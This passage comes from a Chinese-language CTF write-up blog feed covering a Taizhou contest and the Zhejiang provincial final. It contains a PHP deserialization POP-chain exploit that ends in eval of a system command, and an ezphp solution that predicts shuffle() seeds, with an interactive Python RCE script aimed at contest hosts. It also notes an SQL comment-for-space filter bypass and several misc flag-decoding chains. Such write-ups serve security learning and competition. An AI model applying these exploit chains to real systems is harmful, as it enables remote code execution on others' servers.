class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Ez</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">run</span>();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;exit&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Junit</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$judge</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;judge = False;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">e</span>(<span class="hljs-params"><span class="hljs-variable">$arguments</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;judge)<br>        &#123;<br>            <span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&quot;, &quot;</span>, <span class="hljs-variable">$arguments</span>));<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Ez1</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;<span class="hljs-title function_ invoke__">get</span>();<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">get</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;get&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Space</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__wakeup</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;My name is &quot;</span> . <span class="hljs-variable language_">$this</span>-&gt;name;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CallFunction</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$num</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;num = <span class="hljs-number">5</span>;<br>    &#125;<br><br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params"><span class="hljs-variable">$function</span>, <span class="hljs-variable">$arguments</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-variable language_">$this</span>-&gt;num &gt; <span class="hljs-number">10</span>)<br>        &#123;<br>            <span class="hljs-title function_ invoke__">call_user_func</span>(<span class="hljs-variable">$this</span>-&gt;func, <span class="hljs-variable">$arguments</span>);<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">chain</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name = <span class="hljs-variable">$name</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__set</span>(<span class="hljs-params"><span class="hljs-variable">$func</span>, <span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">echo</span> <span class="hljs-variable">$func</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Proc01</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$param</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;param = <span class="hljs-string">&quot;whoami&quot;</span>;<br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__toString</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable language_">$this</span>-&gt;param))<br>        &#123;<br>            <span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;whoami&quot;</span>);<br>        &#125;<br>        <span class="hljs-keyword">return</span> <span class="hljs-variable language_">$this</span>-&gt;param-&gt;arg;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SetName</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$app</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$args</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__isset</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;app-&gt;<span class="hljs-keyword">list</span>(<span class="hljs-variable language_">$this</span>-&gt;args);<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetName</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$app</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$args</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br><br>    &#125;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__get</span>(<span class="hljs-params"><span class="hljs-variable">$name</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;app-&gt;<span class="hljs-keyword">list</span>(<span class="hljs-variable language_">$this</span>-&gt;args);<br>    &#125;<br>&#125;<br><br><br><span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]))<br>&#123;<br>    <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-title function_ invoke__">base64_decode</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]));<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br>&#125;<br></code></pre></td></tr></table></figure><p>在<code>Junit</code>类中存在<code>e</code>方法会执行<code>eval</code>函数<br>可以利用<code>CallFunction</code>类中的<code>__call</code>方法调用<code>Junit</code>类中<code>e</code>方法<br>利用<code>GetName</code>类中的<code>__get</code>方法触发<code>CallFunction</code>类中的<code>__call</code>方法<br>利用<code>Proc01</code>类中的<code>__toString</code>方法触发<code>GetName</code>类中的<code>__get</code>方法<br>利用<code>Space</code>类中的<code>__wakeup</code>方法触发<code>Proc01</code>类中的<code>__toString</code>方法</p><p>调用顺序:<code>Space-&gt;Proc01-&gt;GetName-&gt;CallFunction-&gt;Junit</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Junit</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$judge</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;judge = True;<br>    &#125;<br>&#125;<br><br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">CallFunction</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$num</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$func</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;num=<span class="hljs-number">20</span>;<br>        <span class="hljs-variable language_">$this</span>-&gt;func=[<span class="hljs-keyword">new</span> <span class="hljs-title class_">Junit</span>(),<span class="hljs-string">&quot;e&quot;</span>];<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">GetName</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">private</span> <span class="hljs-variable">$app</span>;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$args</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;app=<span class="hljs-keyword">new</span> <span class="hljs-title class_">CallFunction</span>();<br>        <span class="hljs-variable language_">$this</span>-&gt;args=<span class="hljs-string">&quot;system(&#x27;ls&#x27;);&quot;</span>;<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Proc01</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$param</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>       <span class="hljs-variable language_">$this</span>-&gt;param=<span class="hljs-keyword">new</span> <span class="hljs-title class_">GetName</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Space</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span> <span class="hljs-variable">$name</span>;<br>    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-variable language_">$this</span>-&gt;name=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Proc01</span>();<br>    &#125;<br>&#125;<br><br><span class="hljs-variable">$a</span>=<span class="hljs-keyword">new</span> <span class="hljs-title class_">Space</span>();<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">base64_encode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$a</span>));<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/2022tz-web-3-1.png"></p><h1 id="决赛"><a href="#决赛" class="headerlink" title="决赛"></a>决赛</h1><p>疫情原因线上awd。Rank: 2</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;初赛&quot;&gt;&lt;a href=&quot;#初赛&quot; class=&quot;headerlink&quot; title=&quot;初赛&quot;&gt;&lt;/a&gt;初赛&lt;/h1&gt;&lt;h2 id=&quot;misc&quot;&gt;&lt;a href=&quot;#misc&quot; class=&quot;headerlink&quot; title=&quot;misc&quot;&gt;&lt;/a&gt;misc&lt;/h</summary>
      
    
    
    
    <category term="wp" scheme="https://www.lewiserii.top/categories/wp/"/>
    
    
    <category term="awd" scheme="https://www.lewiserii.top/tags/awd/"/>
    
    <category term="wp" scheme="https://www.lewiserii.top/tags/wp/"/>
    
    <category term="台州" scheme="https://www.lewiserii.top/tags/%E5%8F%B0%E5%B7%9E/"/>
    
  </entry>
  
  <entry>
    <title>第五届浙江省大学生网络与信息安全竞赛决赛-WP</title>
    <link href="https://www.lewiserii.top/%E7%AB%9E%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9B-wp.html"/>
    <id>https://www.lewiserii.top/%E7%AB%9E%E8%B5%9B/%E7%AC%AC%E4%BA%94%E5%B1%8A%E6%B5%99%E6%B1%9F%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E4%B8%8E%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AB%9E%E8%B5%9B%E5%86%B3%E8%B5%9B-wp.html</id>
    <published>2022-09-24T07:00:00.000Z</published>
    <updated>2022-10-02T02:34:35.591Z</updated>
    
    <content type="html"><![CDATA[<p>二战浙江省赛，混了个二等奖。感觉预赛题目都比决赛题目出的好</p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">highlight_file</span>(<span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-title function_ invoke__">time</span>());<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;=<span class="hljs-number">10000</span>;<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$a</span>,<span class="hljs-string">&quot;Ctfer&quot;</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">shuffle</span>(<span class="hljs-variable">$a</span>);<br><span class="hljs-variable">$a</span>[<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;b&#x27;</span>]](<span class="hljs-variable">$a</span>[<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;c&#x27;</span>]]);<br></code></pre></td></tr></table></figure><p>因为<code>shuffle</code>函数使用伪随机数产生器，所以当时间戳相同时，两个相同数组打乱后产生的两个新数组也相同</p><p>在本地编写php代码，获取索引值</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-title function_ invoke__">mt_srand</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;a&#x27;</span>]);<br><br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;system&quot;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;=<span class="hljs-number">10000</span>;<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-title function_ invoke__">array_push</span>(<span class="hljs-variable">$a</span>,<span class="hljs-string">&quot;Ctfer&quot;</span>);<br>&#125;<br><span class="hljs-title function_ invoke__">shuffle</span>(<span class="hljs-variable">$a</span>);<br><br><span class="hljs-keyword">for</span> (<span class="hljs-variable">$i</span>=<span class="hljs-number">0</span>;<span class="hljs-variable">$i</span>&lt;=<span class="hljs-number">10003</span>;<span class="hljs-variable">$i</span>++)&#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span>[<span class="hljs-variable">$i</span>] == <span class="hljs-string">&#x27;system&#x27;</span>)&#123;<br>        <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-string">&#x27;system:&#x27;</span>.<span class="hljs-variable">$i</span>.<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-variable">$a</span>[<span class="hljs-variable">$i</span>] == <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>])&#123;<br>        <span class="hljs-title function_ invoke__">print_r</span>(<span class="hljs-string">&#x27;cmd:&#x27;</span>.<span class="hljs-variable">$i</span>.<span class="hljs-string">&quot;\n&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>将本地获取到的索引值传入靶机，成功rce</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> time<br><span class="hljs-keyword">import</span> re<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    cmd=raw_input(<span class="hljs-string">&quot;&gt;&gt;&quot;</span>).replace(<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-string">&#x27;%20&#x27;</span>);<br>    t=<span class="hljs-built_in">int</span>(time.time())<br>    d=requests.get(<span class="hljs-string">&#x27;http://172.29.17.232/index.php?a=%s&amp;cmd=%s&#x27;</span>%(<span class="hljs-built_in">int</span>(t),cmd)).text<br><br>    system=<span class="hljs-built_in">int</span>(re.findall(<span class="hljs-string">&#x27;system:(\d+)&#x27;</span>,d)[<span class="hljs-number">0</span>])<br>    c=<span class="hljs-built_in">int</span>(re.findall(<span class="hljs-string">&#x27;cmd:(\d+)&#x27;</span>,d)[<span class="hljs-number">0</span>])<br><br>    d=requests.get(<span class="hljs-string">&#x27;http://80.endpoint-d9deec0835844de5831e550ffe384d16.dasc.buuoj.cn:81/?cmd=%s&amp;c=%s&amp;b=%s&#x27;</span>%(cmd,c,system))<br>    <span class="hljs-built_in">print</span>(d.text.split(<span class="hljs-string">&#x27;&lt;/code&gt;&#x27;</span>)[<span class="hljs-number">1</span>])<br></code></pre></td></tr></table></figure><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-ezphp-1.png"></p><h2 id="babysql"><a href="#babysql" class="headerlink" title="babysql"></a>babysql</h2><p>过滤了空格，用<code>/**/</code>代替</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-babysql-1.png"></p><h1 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h1><h2 id="checkin-gift"><a href="#checkin-gift" class="headerlink" title="checkin_gift"></a>checkin_gift</h2><p>两张图片中间拿到<code>Gift from glzjin: FIWOIxqEZyIWJwIHG01ZDxqMZ1EUGycHGHHlERqnDyAUDyERHH9PI0qOZ0EWGIcEGIxlESSAGREAHGWUF05RAD== Have a nice time, Bye!</code></p><p>先凯撒位移13位</p><p><code>SVJBVkdRMlVJWjVUT01MQkdZM1RHTlpUTUUyREdaQlNHQlREUU9CV0dBM0RJTVpRTVkyRFFNTERNUTJHS05ENQ==</code></p><p>base64</p><p><code>IRAVGQ2UIZ5TOMLBGY3TGNZTME2DGZBSGBTDQOBWGA3DIMZQMY2DQMLDMQ2GKND5</code></p><p>base32</p><p><code>DASCTF&#123;71a67373a43d20f88606430f481cd4e4&#125;</code></p><h2 id="m4a"><a href="#m4a" class="headerlink" title="m4a"></a>m4a</h2><p>在文件结尾发现一个被反转的压缩包，提取出来一个带密码的压缩包</p><p>添加后缀<code>mp4</code>发现存在摩斯</p><p><code>-... .- ....- ...-- -... -.-. . ..-. -.-. ..--- ----- ....-</code></p><p>得到压缩包密码<code>BA43BCEFC204</code></p><p>解压得到<br><code>(+w)v&amp;LdG_FhgKhdFfhgahJfKcgcKdc_eeIJ_gFN</code></p><p>rot47</p><p><code>WZHXGU&#123;5v0u98z95u79829y7z484z54066xy08u&#125;</code></p><p>atbash</p><p><code>dasctf&#123;5e0f98a95f79829b7a484a54066cb08f&#125;</code></p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-m4a-1.png"></p><h2 id="Unkn0wnData"><a href="#Unkn0wnData" class="headerlink" title="Unkn0wnData"></a>Unkn0wnData</h2><p><em>赛后复现</em></p><p>附件结尾存在一串base64字符串</p><p><code>V2hlcmUxc0tleT8KCu2gve25g+2gve2yte2gvO28v+2gvO2+pO2gve26qu2gvO28j+2gve2wju2gvu21i+2gve26q+2gve24huKche2gvO29je2gvO2+pO2gve2wmO2gvO28j+KEueKMqO2gve24je2gvO2+iOKcie2gvu20o+2gve27qe2gvO29jO2gve26qu2gvO29tOKEueKYuu2gve26ueKdk+2gvO29tO2gve20rO2gvO28qu2gvO29te2gve2xo+2gve20hOKYg+2gve2xjO2gve24ju2gve2xjO2gve20hO2gve2xjO2gve20qu2gvO29jO2gve2xge2gvO29je2gvO29jO2gvO28j+2gvO2+g+2gve26sO2gvO29te2gve2wje2gvO2+heKche2gvO29je2gvu22k+2gve24ju2gve24iu2gvu20o+2gvO2/ue2gvO29je2gve2yp+2gve20hO2gve20hO2gvu20o+2gve2xge2gvu21i+2gve26q+KYuu2gvO29tO2gve24ge2gve26q+2gve24h+2gve26sOKPqe2gve24je2gvO28v+2gve2yte2gvu22k+2gve24h+2gve27qeKclu2gve21ue2gve2wju2gve2zgu2gve2zgu2gve2yp+2gve23ku2gve23kg==</code></p><p>解密后用<code>UTF-8</code>编码显示</p><p><img src="https://lewiserii.oss-cn-hangzhou.aliyuncs.com/blog/zjssjs-Unkn0wnData-1.png"></p><p>stegsolve分析图片，0通道中发现一个压缩包</p><p>解压得到key.txt</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><code class="hljs 